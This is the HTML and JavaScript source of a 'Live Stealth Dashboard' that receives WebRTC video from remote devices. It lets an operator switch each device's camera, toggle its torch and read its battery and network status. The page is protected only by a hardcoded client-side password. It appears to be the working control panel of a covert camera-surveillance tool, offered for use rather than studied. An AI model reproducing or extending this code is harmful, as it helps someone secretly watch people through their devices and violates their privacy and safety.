<!DOCTYPE html>
<html>
<head>
    <title>Advanced Monitor</title>
    <style>
        body{background:#111;color:white;font-family:sans-serif;text-align:center;margin:0;}
        #box{display:flex;flex-wrap:wrap;justify-content:center;padding:20px;gap:20px;}
        .card{background:#222;padding:15px;border-radius:12px;border:1px solid #444;width:350px;}
        video{width:100%;background:#000;border-radius:8px;}
        .info{font-size:12px;margin:10px 0;display:flex;justify-content:space-around;color:#aaa;}
        button{padding:10px;margin:5px;cursor:pointer;border:none;border-radius:5px;background:#333;color:white;font-weight:bold;flex:1;}
        .btn-torch-on { background: #28a745 !important; }
        .btn-torch-off { background: #dc3545 !important; }
        #login{position:fixed;top:0;left:0;width:100%;height:100%;background:#000;display:flex;align-items:center;justify-content:center;z-index:99;}
    </style>
</head>
<body>
    <div id="login"><div><h2>ğŸ”’ Admin Panel</h2><input type="password" id="ps" placeholder="rony25" style="padding:10px;"><br><br><button onclick="if(document.getElementById('ps').value=='rony25'){document.getElementById('login').style.display='none';init();}">Login</button></div></div>
    <h2>ğŸ›°ï¸ Live Stealth Dashboard</h2>
    <div id="box"></div>
    <script src="/socket.io/socket.io.js"></script>
    <script>
        let socket, peers = {};
        function init() {
            socket = io();
            socket.on("offer", async (d) => {
                if(peers[d.id]) return;
                const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
                peers[d.id] = pc;
                const card = document.createElement("div"); card.className="card"; card.id="c-"+d.id;
                card.innerHTML = `<video id="v-${d.id}" autoplay playsinline controls></video>
                    <div class="info" id="i-${d.id}">ğŸ”‹ --% | ğŸŒ --</div>
                    <div style="display:flex;">
                        <button onclick="socket.emit('switch','${d.id}')">ğŸ”„ Switch</button>
                        <button id="t-${d.id}" class="btn-torch-off" onclick="socket.emit('torch','${d.id}')">ğŸ’¡ Light: OFF</button>
                    </div>`;
                document.getElementById("box").appendChild(card);
                pc.ontrack = e => document.getElementById("v-"+d.id).srcObject = e.streams;
                await pc.setRemoteDescription(new RTCSessionDescription(d.offer));
                const a = await pc.createAnswer(); await pc.setLocalDescription(a);
                socket.emit("answer", { answer: a, id: d.id });
                pc.onicecandidate = e => e.candidate && socket.emit("ice", { candidate: e.candidate, id: d.id });
            });

            socket.on("status-update", d => {
                const info = document.getElementById("i-"+d.id);
                if(info) info.innerText = `ğŸ”‹ ${d.battery || '--'}% | ğŸŒ ${d.network || '--'}`;
                const btn = document.getElementById("t-"+d.id);
                if(btn && d.torch !== undefined) {
                    btn.innerText = d.torch ? "ğŸ’¡ Light: ON" : "ğŸ’¡ Light: OFF";
                    btn.className = d.torch ? "btn-torch-on" : "btn-torch-off";
                }
            });
            socket.on("user-left", id => { document.getElementById("c-"+id)?.remove(); delete peers[id]; });
        }
    </script>
</body>
</html>
